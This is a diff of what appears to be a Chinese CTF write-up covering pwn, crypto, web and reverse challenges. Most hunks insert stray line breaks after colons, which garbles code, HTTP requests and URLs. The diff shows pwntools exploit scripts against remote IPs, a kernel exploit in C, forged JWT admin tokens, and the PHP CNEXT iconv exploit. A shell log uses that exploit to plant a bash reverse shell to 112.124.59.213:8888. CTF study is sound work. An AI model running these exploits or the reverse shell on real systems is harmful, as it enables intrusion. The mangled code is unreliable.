@@ -69,29 +69,53 @@ delete_user
 
 劫持 tcache 为堆地址，使得恰好可以控制 show_user 的指针部分。
 
-.text:00000000004DA910 show_user proc near ; CODE XREF: _cgo_22187f6e70a4_Cfunc_show_user+7↓j
-.text:00000000004DA910 ; DATA XREF: LOAD:0000000000400B78↑o
-.text:00000000004DA910 ; __unwind {
-.text:00000000004DA910 endbr64
-.text:00000000004DA914 push rbx ; s
-.text:00000000004DA915 call find_user
-.text:00000000004DA91A test rax, rax
-.text:00000000004DA91D jz short loc_4DA980
-.text:00000000004DA91F cmp qword ptr [rax+100h], 0
-.text:00000000004DA927 mov rbx, rax
-.text:00000000004DA92A jz short loc_4DA960
-.text:00000000004DA92C
-.text:00000000004DA92C loc_4DA92C: ; CODE XREF: show_user+66↓j
-.text:00000000004DA92C lea rdi, aUserContent ; "user content:n"
-.text:00000000004DA933 call puts
-.text:00000000004DA938 mov edx, [rbx+10Ch]
-.text:00000000004DA93E mov rsi, [rbx+100h]
-.text:00000000004DA945 xor eax, eax
-.text:00000000004DA947 mov edi, 1
-.text:00000000004DA94C call _write
-.text:00000000004DA951 lea rdi, aShowUserConten ; "show user content success"
-.text:00000000004DA958 pop rbx
-.text:00000000004DA959 jmp puts
+.text:
+00000000004DA910 show_user proc near ; CODE XREF: _cgo_22187f6e70a4_Cfunc_show_user+7↓j
+.text:
+00000000004DA910 ; DATA XREF: LOAD:
+0000000000400B78↑o
+.text:
+00000000004DA910 ; __unwind {
+.text:
+00000000004DA910 endbr64
+.text:
+00000000004DA914 push rbx ; s
+.text:
+00000000004DA915 call find_user
+.text:
+00000000004DA91A test rax, rax
+.text:
+00000000004DA91D jz short loc_4DA980
+.text:
+00000000004DA91F cmp qword ptr [rax+100h], 0
+.text:
+00000000004DA927 mov rbx, rax
+.text:
+00000000004DA92A jz short loc_4DA960
+.text:
+00000000004DA92C
+.text:
+00000000004DA92C loc_4DA92C: ; CODE XREF: show_user+66↓j
+.text:
+00000000004DA92C lea rdi, aUserContent ; "user content:n"
+.text:
+00000000004DA933 call puts
+.text:
+00000000004DA938 mov edx, [rbx+10Ch]
+.text:
+00000000004DA93E mov rsi, [rbx+100h]
+.text:
+00000000004DA945 xor eax, eax
+.text:
+00000000004DA947 mov edi, 1
+.text:
+00000000004DA94C call _write
+.text:
+00000000004DA951 lea rdi, aShowUserConten ; "show user content success"
+.text:
+00000000004DA958 pop rbx
+.text:
+00000000004DA959 jmp puts
 
 泄漏 puts 函数地址
 
@@ -226,7 +250,8 @@ key = b"S0C0Z0Y0W"
 basedecode_enc = base64.b64decode("YgNxAGMDawJjZQR6B2IGYANiYQVxAG8JYQhkawZ3AW8JagluYAN2Am4GbQRmZAR6AWwBbQNlZANxCWsCaAlhZQRxAm4CbgRkZgl1AWIIawhmYAh3B2MBaAJmaghwAWoEbwliYgBwCWkIbQNuawlyAW0FYAhuYgB1Am8CawRuYAJxCG8CbgRgZAF3BWgJYQlhZwFzAGsJbwFlagV0CW0FawhgawNyCGkAbQNjYQh3Bm4FbwNkYAJ6A2IDaANmYwl2A2sEaQRlaglyAm0HaARmYQZ7AWsIbwZhYwB0B2sIYAlvYgN2AWsHYQJiZAByAGgDYANmYQB0BmwJYABhZwl1CGkEaQlmZQJzBm0IYQdjYwh6A20BbwVhZQl3CGoIaABmYAN1AW0IbQFvYAN0B2gFYAVhZAF1BW8HYQZvagZ6A20CaAhjZAl6BWkCYQhvZAN1AGgDaQJhYQZzCW8BYABjZAN0AW8BbQViZwVyA28JagJiagd1CGgDawhvYQJwB28GagNvYwd6AG0BYQFuawVyBGoBaQFkZAV1A24HbgdlYgd1AWwIYQNkagV6BW0DbglvZAl0A2kFaAhjawB3AmwAbwZgZwV3BGMEaQllYAhzAGsEYAFhYAJ6Bm4GaQdkagl6A20DawdkZgd3BW0JbgRgYQZyB2kJbANnZgdwA2gFaQFnYAh7BW4GbAdhYgd7Bm4DawJmawN0CWMDbgJgYwh0AmwGYQRiYQN2BmIGaAVkYwh2BmsDbAFhaglzB2kAbQBjZwJ1BGkCaghiZgByAWkJaAhhagZ3AG0JaghiYQVwAmMIaAFjYgVzBGh0dHA6Ly80Ny4xMDkuMTA2LjYyOjkwOTB7Im5hbWUiOiJTQ1RGIiwicGFzc3dvcmQiOiI4ODg4ODg4OCJ9")
 
 str_index = basedecode_enc.index(b"http")
-basedecode_enc = bytearray(basedecode_enc[:str_index])
+basedecode_enc = bytearray(basedecode_enc[:
+str_index])
 
 for i in range(len(basedecode_enc)):
     basedecode_enc[i] ^= key[i % len(key)]
@@ -235,7 +260,8 @@ str_all = "10669721913248017310606431714870563867652912174255756" + "7770857
 str_1 = "144819424465842307806353672547344125290716753535239658417883828941232509622838692761917211806963011168822281666033695157426515864265527046213326145174398018859056439431422867957079149967592078894410082695714160599647180947207504108618794637872261572262805565517756922288320779308895819726074229154002310375209"
 
 p = int(str_all[str_all.index(str_1):])
-q = int(str_all[:str_all.index(str_1)])
+q = int(str_all[:
+str_all.index(str_1)])
 e = 65537
 n = p * q
 f = (p - 1) * (q - 1)
@@ -330,17 +356,29 @@ cert1.pem
 
 30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
     02 81 80
-        1b 5d 4f e0 aa 67 82 e2 75 d4 ce 12 a6 d5 75 62 ef bb e7 db 6f 52 77 25 5b 89 17 29 bf a2 a1 8d 3e db 49 84 3d 79 89 a3 7b 95 16 be 2d f8 ca 93 90 58 e6 5f 64 b5 fb 20 71 be a4 f5 f8 d1 39 28 95 b3 2b f0 37 7d 99 f4 f7 99 79 12 5e 5d b0 1c db 50 80 a1 c2 d6 65 c9 ac 31 b5 82 30 25 49 9c 95 13 27 7b ae 5e 7a 84 6c d2 71 c4 39 6e 2b a2 19 02 0e 58 a9 05 5c b1 8a 28 d3 6a 00 bf 71 7b
+1b5d4fe0aa6782e275d4ce12a6d57562efbbe7db6f5277255b891729bfa2a18d
+3edb49843d7989a37b9516be2df8ca939058e65f64b5fb2071bea4f5f8d13928
+95b32bf0377d99f4f79979125e5db01cdb5080a1c2d665c9ac31b5823025499c
+9513277bae5e7a846cd271c4396e2ba219020e58a9055cb18a28d36a00bf717b
     02 81 80
-        07 9f 5c cc 66 57 67 b4 a2 57 e5 c1 ff 56 e9 80 3d f2 e5 65 03 02 da ad 42 01 05 fe 67 24 47 74 3b d3 f0 be a1 c4 6a 49 87 93 2e 9a 88 6c a8 7a 7a fd 77 96 ab f1 e5 62 9c 49 86 fe 4f 22 e8 9c dc e7 ab b0 66 24 46 51 46 a2 e2 b6 ca 9a b3 19 6c ea b7 46 79 74 c1 dc 45 60 8a 20 04 11 b2 91 fd af 99 f7 d8 0d ce 4d b3 56 6f 4a 9e 2e 57 4c 62 24 cd 07 d8 06 38 d2 8f 78 20 bc f4 b4 91 43
+079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
+3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
+dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
+fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143
 
 cert2.pem
 
 30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
     02 81 80
-        07 1c 32 4e 87 69 49 31 87 c1 5f 72 d5 cc 69 57 29 b4 84 88 ee 3f bd 01 db 00 d5 c4 78 f0 8c 7c f3 20 93 ba 61 74 50 51 d3 e9 d1 69 52 3a a9 14 38 18 1f 47 67 9a ff 5e dd 22 95 0f 74 a1 eb 14 43 32 0a aa 5d 97 f5 c1 e8 1b 5e f9 a3 e6 9b a6 69 ab c4 c6 c4 b4 05 f5 08 8a 60 3a 74 f9 bc ef 88 82 3b 45 23 57 41 14 c8 10 60 08 38 72 81 96 f8 e5 e0 d4 ae ee ea b7 9d d8 68 3a 72 f3 c0 17
+071c324e8769493187c15f72d5cc695729b48488ee3fbd01db00d5c478f08c7c
+f32093ba61745051d3e9d169523aa91438181f47679aff5edd22950f74a1eb14
+43320aaa5d97f5c1e81b5ef9a3e69ba669abc4c6c4b405f5088a603a74f9bcef
+88823b4523574114c810600838728196f8e5e0d4aeeeeab79dd8683a72f3c017
     02 81 80
-        07 9f 5c cc 66 57 67 b4 a2 57 e5 c1 ff 56 e9 80 3d f2 e5 65 03 02 da ad 42 01 05 fe 67 24 47 74 3b d3 f0 be a1 c4 6a 49 87 93 2e 9a 88 6c a8 7a 7a fd 77 96 ab f1 e5 62 9c 49 86 fe 4f 22 e8 9c dc e7 ab b0 66 24 46 51 46 a2 e2 b6 ca 9a b3 19 6c ea b7 46 79 74 c1 dc 45 60 8a 20 04 11 b2 91 fd af 99 f7 d8 0d ce 4d b3 56 6f 4a 9e 2e 57 4c 62 24 cd 07 d8 06 38 d2 8f 78 20 bc f4 b4 91 43
+079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
+3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
+dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
+fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143
 
 这题看下两个e是一样的，但是n不一样，而且题目说了有个关键的参数是345bit，大概率是d，所以猜测只有一组e,d。了解到Dual RSA——双生RSA，对偶RSA | 独奏の小屋 (hasegawaazusa.github.io)
 
@@ -594,15 +632,19 @@ ezRender
 抓取注册请求包 （爆破2048个以上）
 
 POST /register HTTP/1.1
-Host: 124.220.229.60:8080
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 124.220.229.60:
+8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+130.0) Gecko/20100101 Firefox/130.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
-Referer: http://124.220.229.60:8080/register
+Referer: http://124.220.229.60:
+8080/register
 Content-Type: application/json
 Content-Length: 42
-Origin: http://124.220.229.60:8080
+Origin: http://124.220.229.60:
+8080
 Connection: close
 Priority: u=0
 
@@ -636,10 +678,13 @@ from app import *
 from User import *
 
 def generateToken(user):
-    secret={"name":user,"is_admin":"1"}
+    secret={"name":
+user,"is_admin":"1"}
     
     verify_c=jwt.encode(secret, secret_key, algorithm='HS256')
-    infor={"name":user,"secret":verify_c}
+    infor={"name":
+user,"secret":
+verify_c}
     token=base64.b64encode(json.dumps(infor).encode()).decode()
     print(infor)
     print(token)
@@ -652,16 +697,20 @@ generateToken('admin2060')
 伪造玩JWT后，删除部分用户，使存在的用户少于2048个
 
 POST /removeUser HTTP/1.1
-Host: 1.95.40.5:29351
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 1.95.40.5:
+29351
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+130.0) Gecko/20100101 Firefox/130.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
 Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
-Referer: http://124.220.229.60:8080/register
+Referer: http://124.220.229.60:
+8080/register
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
-Origin: http://124.220.229.60:8080
+Origin: http://124.220.229.60:
+8080
 Connection: close
 Priority: u=0
 
@@ -670,16 +719,20 @@ username=admin§1§
 code为传恶意代码的地方，使用内存马读取flag
 
 POST /admin HTTP/1.1
-Host: 1.95.40.5:29351
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Host: 1.95.40.5:
+29351
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+130.0) Gecko/20100101 Firefox/130.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
-Referer: http://124.220.229.60:8080/register
+Referer: http://124.220.229.60:
+8080/register
 Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 323
-Origin: http://124.220.229.60:8080
+Origin: http://124.220.229.60:
+8080
 Connection: close
 Priority: u=0
 
@@ -831,7 +884,8 @@ gzip 1.jpg
 
 上传成功得到回显
 
-{"status":200,"msg":"图片上传成功","data":{"name":"749e04b0905aa5bf0a364f86a70f7d74.jpg.jpg","url":"http://1.95.73.253/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg"},"code":"100009"}
+{"status":
+200,"msg":"图片上传成功","data":{"name":"749e04b0905aa5bf0a364f86a70f7d74.jpg.jpg","url":"http://1.95.73.253/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg"},"code":"100009"}
 
 同时也得到了图片的存储的路径：
 
@@ -950,7 +1004,8 @@ class Exploit:
         def safe_download(path: str) -> bytes:
             try:
                 return self.remote.download(path)
-            except ConnectionError:
+            
+except ConnectionError:
                 failure("Target not [b]reachable[/] ?")
           
 
@@ -960,7 +1015,8 @@ class Exploit:
 
         text = tf.random.string(50).encode()
         base64 = b64(text, misalign=True).decode()
-        path = f"data:text/plain;base64,{base64}"
+        path = f"data:
+text/plain;base64,{base64}"
       
         result = safe_download(path)
       
@@ -976,7 +1032,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(text.encode(), misalign=True).decode()
-        path = f"php://filter//resource=data:text/plain;base64,{base64}"
+        path = f"php://filter//resource=data:
+text/plain;base64,{base64}"
         if not check_token(text, path):
             failure("The [i]php://filter/[/] wrapper does not work")
 
@@ -984,7 +1041,8 @@ class Exploit:
 
         text = tf.random.string(50)
         base64 = b64(compress(text.encode()), misalign=True).decode()
-        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
+        path = f"php://filter/zlib.inflate/resource=data:
+text/plain;base64,{base64}"
 
         if not check_token(text, path):
             failure("The [i]zlib[/] extension is not enabled")
@@ -1068,7 +1126,8 @@ class Exploit:
             if region.permissions == "rw-p"
             and region.size >= HEAP_SIZE
             and region.stop & (HEAP_SIZE-1) == 0
-            and region.path in ("", "[anon:zend_alloc]")
+            and region.path in ("", "[anon:
+zend_alloc]")
         ]
 
         if not heaps:
@@ -1298,7 +1357,8 @@ class Exploit:
 
         resource = compress(compress(pages))
         resource = b64(resource)
-        resource = f"data:text/plain;base64,{resource.decode()}"
+        resource = f"data:
+text/plain;base64,{resource.decode()}"
 
         filters = [
             # Create buckets
@@ -1337,7 +1397,8 @@ class Exploit:
 
         try:
             self.remote.send(path)
-        except (ConnectionError, ChunkedEncodingError):
+        
+except (ConnectionError, ChunkedEncodingError):
             pass
       
         msg_print()
@@ -1371,7 +1432,8 @@ def compressed_bucket(data: bytes) -> bytes:
 def qpe(data: bytes) -> bytes:
     """Emulates quoted-printable-encode.
     """
-    return "".join(f"={x:02x}" for x in data).upper().encode()
+    return "".join(f"={x:
+02x}" for x in data).upper().encode()
 
 def ptr_bucket(*ptrs, size=None) -> bytes:
     """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
@@ -1413,7 +1475,8 @@ class Region:
         return self.stop - self.start
 
 Exploit()
- root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'echo "/bin/bash -c "bash -i >& /dev/tcp/112.124.59.213/8888 0>&1"" > /tmp/night'
+ root@webn1ght:~/poc/php-filter-iconv-main
+# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'echo "/bin/bash -c "bash -i >& /dev/tcp/112.124.59.213/8888 0>&1"" > /tmp/night'
 [*] The data:// wrapper works
 [*] The php://filter/ wrapper works
 [*] The zlib extension is enabled
@@ -1423,7 +1486,8 @@ Exploit()
 
      EXPLOIT  SUCCESS 
 
-root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'chmod +x /tmp/night'
+root@webn1ght:~/poc/php-filter-iconv-main
+# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'chmod +x /tmp/night'
 [*] The data:// wrapper works
 [*] The php://filter/ wrapper works
 [*] The zlib extension is enabled
@@ -1433,7 +1497,8 @@ root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.
 
      EXPLOIT  SUCCESS 
 
-root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'bash /tmp/night'
+root@webn1ght:~/poc/php-filter-iconv-main
+# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'bash /tmp/night'
 [*] The data:// wrapper works
 [*] The php://filter/ wrapper works
 [*] The zlib extension is enabled
@@ -1537,7 +1602,8 @@ function verifyAdmin(req, res, next) {
 }
 
 app.get('/hello', verifyAdmin ,(req, res)=> {
-  res.send('<h1>Welcome Admin!!!</h1><br><img src="./1.jpeg" />');
+  res.send('<h1>Welcome Admin!!!</h1>
+');
 });
 
 app.get('/config', (req, res) => {
@@ -1655,7 +1721,8 @@ app.get("/VanZY_s_T3st", (req, res) => {
 })
 
 app.listen(3000, () => {
-  console.log('Server running on http://localhost:3000');
+  console.log('Server running on http://localhost:
+3000');
 });
 
 java解密脚本
@@ -1704,90 +1771,32 @@ package.json
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Report Submission</title>
 
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-            line-height: 1.6;
-            padding: 20px;
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 20px;
-            color: #333;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-        }
-        label {
-            font-weight: bold;
-            display: block;
-            margin-bottom: 10px;
-        }
-        input[type="text"], textarea {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        textarea {
-            resize: vertical;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 4px;
-            width: 100%;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .report-count {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-    </style>
+    
 </head>
-<body>
+
 <h1>Submit a Report</h1>
 
-<div class="container">
-    <div class="report-count">
-        <p>Current number of reports: <span id="report-count">Loading...</span></p>
-    </div>
+
+    
+        Current number of reports: Loading...
+    
 
     <form action="/report" method="POST">
-        <div class="form-group">
+        
             <label for="user">User:</label>
-            <input type="text" id="user" name="user" required>
-        </div>
+            
+        
 
-        <input type="hidden" id="date" name="date">
+        
 
-        <div class="form-group">
+        
             <label for="reportmessage">Report Message:</label>
             <textarea id="reportmessage" name="reportmessage" rows="6" required></textarea>
-        </div>
+        
 
-        <button type="submit">Submit Report</button>
+        Submit Report
     </form>
-</div>
+
 
 <script>
     window.onload = function() {
@@ -1811,14 +1820,15 @@ package.json
             });
     };
 </script>
-</body>
+
 </html>
 
 /static/report_noway_dirsearch.html文件
 
 启动环境
 
-docker run -itd –name mysql-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.19
+docker run -itd –name mysql-test -p 3306:
+3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.19
 
 Misc
 
@@ -1840,16 +1850,13 @@ Fixlt
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>像素图渲染</title>
-    <style>
-    ......
-    ......
-    </style>
+    
 </head>
-<body>
-    <div class="pixel-wrap">
-        <div class="pixel"></div>
-    </div>
-</body>
+
+    
+        
+    
+
 </html>
 
 打开之后鼠标放上去图案会动 是AZTEC码
@@ -1860,13 +1867,16 @@ Fixlt
 
 欢迎师傅们加入我们:
 
-星盟安全团队纳新群1:222328705
+星盟安全团队纳新群1:
+222328705
 
-星盟安全团队纳新群2:346014666
+星盟安全团队纳新群2:
+346014666
 
 有兴趣的师傅欢迎一起来讨论!
 
-PS:团队纳新简历投递邮箱：
+PS:
+团队纳新简历投递邮箱：
 
 xmcve@qq.com
 
@@ -1874,36 +1884,56 @@ xmcve@qq.com
 
 
 ```
-.text:00000000004DA910 show_user proc near ; CODE XREF: _cgo_22187f6e70a4_Cfunc_show_user+7↓j
-.text:00000000004DA910 ; DATA XREF: LOAD:0000000000400B78↑o
-.text:00000000004DA910 ; __unwind {
-.text:00000000004DA910 endbr64
-.text:00000000004DA914 push rbx ; s
-.text:00000000004DA915 call find_user
-.text:00000000004DA91A test rax, rax
-.text:00000000004DA91D jz short loc_4DA980
-.text:00000000004DA91F cmp qword ptr [rax+100h], 0
-.text:00000000004DA927 mov rbx, rax
-.text:00000000004DA92A jz short loc_4DA960
-.text:00000000004DA92C
-.text:00000000004DA92C loc_4DA92C: ; CODE XREF: show_user+66↓j
-.text:00000000004DA92C lea rdi, aUserContent ; "user content:n"
-.text:00000000004DA933 call puts
-.text:00000000004DA938 mov edx, [rbx+10Ch]
-.text:00000000004DA93E mov rsi, [rbx+100h]
-.text:00000000004DA945 xor eax, eax
-.text:00000000004DA947 mov edi, 1
-.text:00000000004DA94C call _write
-.text:00000000004DA951 lea rdi, aShowUserConten ; "show user content success"
-.text:00000000004DA958 pop rbx
-.text:00000000004DA959 jmp puts
-```
-
-
-
-```
+.text:
+00000000004DA910 show_user proc near ; CODE XREF: _cgo_22187f6e70a4_Cfunc_show_user+7↓j
+.text:
+00000000004DA910 ; DATA XREF: LOAD:
+0000000000400B78↑o
+.text:
+00000000004DA910 ; __unwind {
+.text:
+00000000004DA910 endbr64
+.text:
+00000000004DA914 push rbx ; s
+.text:
+00000000004DA915 call find_user
+.text:
+00000000004DA91A test rax, rax
+.text:
+00000000004DA91D jz short loc_4DA980
+.text:
+00000000004DA91F cmp qword ptr [rax+100h], 0
+.text:
+00000000004DA927 mov rbx, rax
+.text:
+00000000004DA92A jz short loc_4DA960
+.text:
+00000000004DA92C
+.text:
+00000000004DA92C loc_4DA92C: ; CODE XREF: show_user+66↓j
+.text:
+00000000004DA92C lea rdi, aUserContent ; "user content:n"
+.text:
+00000000004DA933 call puts
+.text:
+00000000004DA938 mov edx, [rbx+10Ch]
+.text:
+00000000004DA93E mov rsi, [rbx+100h]
+.text:
+00000000004DA945 xor eax, eax
+.text:
+00000000004DA947 mov edi, 1
+.text:
+00000000004DA94C call _write
+.text:
+00000000004DA951 lea rdi, aShowUserConten ; "show user content success"
+.text:
+00000000004DA958 pop rbx
+.text:
+00000000004DA959 jmp puts
 #!/usr/bin/env python3
-# -*- coding:utf-8 -*-
+# -*- coding:
+utf-8 -*-
 
 from pwn import *
 context.clear(arch='amd64', os='linux', log_level='debug')
@@ -1941,11 +1971,6 @@ success('puts_addr: ' + hex(puts_addr))
 sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":-1,"content":"' + base64.b64encode(b'`cat flag`') + b'","username":"' + base64.b64encode(hex(puts_addr).encode() + b' ') + b'","size":64}]')
 
 sh.interactive()
-```
-
-
-
-```
 from pwn import *
 from LibcSearcher import *
 import ctypes
@@ -1956,17 +1981,17 @@ from math import log
 import warnings
 banary = "./pwn"
 elf = ELF(banary)
-#libc = ELF("./libc.so.6")
-#libc=ELF("/home/berial/libc/64bit/libc-2.27.so")
-#libc=ELF("/home/berial/libc/64bit/libc-2.23.so")
-#libc=ELF("/home/berial/libc/32bit/libc-2.27.so")
-#libc=ELF("/home/berial/libc/32bit/libc-2.23.so")
-#libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
-#libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
-#libc=ELF("/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
+    #libc = ELF("./libc.so.6")
+    #libc=ELF("/home/berial/libc/64bit/libc-2.27.so")
+    #libc=ELF("/home/berial/libc/64bit/libc-2.23.so")
+    #libc=ELF("/home/berial/libc/32bit/libc-2.27.so")
+    #libc=ELF("/home/berial/libc/32bit/libc-2.23.so")
+    #libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
+    #libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
+    #libc=ELF("/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
 warnings.filterwarnings("ignore", category=BytesWarning)
 context(log_level = 'debug', os = 'linux', arch = 'amd64')
-#context(log_level = 'debug', os = 'linux', arch = 'i386')
+    #context(log_level = 'debug', os = 'linux', arch = 'i386')
 
 def debug(a=''):
     if a != '':
@@ -1995,10 +2020,12 @@ iuu64 = lambda : int(io.recv(6),16)
 uheap = lambda : u64(io.recv(6).ljust(8,b'x00'))
 lg = lambda addr : log.info(addr)
 ia = lambda : io.interactive()
-lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
+lss = lambda s :
+log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
 p = lambda s: print(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
 #----------------------------------------------------------------
-url = '1.95.68.23:58924'
+url = '1.95.68.23:
+58924'
 local = 0
 if local:
     io = process(banary)
@@ -2034,25 +2061,20 @@ pay += flat([0x31, 0x26,p32(0), 0x25, 0x26,p32(0), 0x25, 0x26,p32(0), 0x
 pay += flat([0x25, 0x26, p32(1), 0x26, p32(1), 0x30], word_size=8)
 sa(b'shellcode', pay)
 
-#debug()
+    #debug()
 ia()
-```
-
-
-
-```
-#include <stdlib.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <syscall.h>
-#include <linux/userfaultfd.h>
-#include <pthread.h>
-#include <poll.h>
-#define TTY_STRUCT_MAGIC 0x0000000100005401
+    #include <stdlib.h>
+    #include <fcntl.h>
+    #include 
+    #include <stdio.h>
+    #include <sys/ioctl.h>
+    #include <sys/mman.h>
+    #include <string.h>
+    #include <syscall.h>
+    #include <linux/userfaultfd.h>
+    #include 
+    #include 
+    #define TTY_STRUCT_MAGIC 0x0000000100005401
 /*
 >>> hex(base - libc.sym['commit_creds'])
 '-0x97d00'
@@ -2191,11 +2213,6 @@ int main() {
     }
     return 0;
 }
-```
-
-
-
-```
 pop_rdi = 0x0000000000401ebf
 pop_rsi = 0x0000000000409f2e
 pop_rdx_rbx = 0x000000000047ed6b
@@ -2243,15 +2260,10 @@ func main() {
     return 0
 }
 '''
-```
-
-
-
-```
 from pwn import *      
 context(log_level='debug',os='linux',arch='amd64')
 pwnfile = './factory'
-#io=process(pwnfile)
+    #io=process(pwnfile)
 io=remote('1.95.81.93',57777)
 elf = ELF(pwnfile)          
 libc = ELF("./libc.so.6")
@@ -2276,7 +2288,7 @@ io.sendlineafter(" = ",str(puts_got))
 io.sendlineafter(" = ",str(puts_plt))
 io.sendlineafter(" = ",str(0x040148F))
 
-#debug()
+    #debug()
 for i in range(7):
     io.sendlineafter(" = ",b'0')
 
@@ -2299,17 +2311,12 @@ io.sendlineafter(" = ",str(sys_adr))
 
 for i in range(6):
     io.sendlineafter(" = ",b'0')
-#debug()
+    #debug()
 io.sendlineafter(" = ",b'0')
 
 io.interactive()
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdint.h>  
+    #include <stdio.h>
+    #include <stdint.h>  
 
 int  sub_810004C(char* a1)
 {
@@ -2365,14 +2372,9 @@ int main() {
 
     return 0;
 }
-```
-
-
-
-```
-#include <stdio.h>  
-#include <string.h>  
-#include <stdint.h>  
+    #include <stdio.h>  
+    #include <string.h>  
+    #include <stdint.h>  
 
 unsigned int* __fastcall sub_8104CA8_1(uint32_t* result, uint32_t* a2)
 {
@@ -2405,11 +2407,6 @@ int main() {
     printf("%x %x", enc[0], enc[1]);
     return 0;
 }
-```
-
-
-
-```
 from Crypto.Cipher import ARC4
 enc =[20,166, 145, 254, 185 ,215, 65 ,175 ,130 ,204 ,78 ,233 ,71 ,71 ,40 ,79, 209]
 
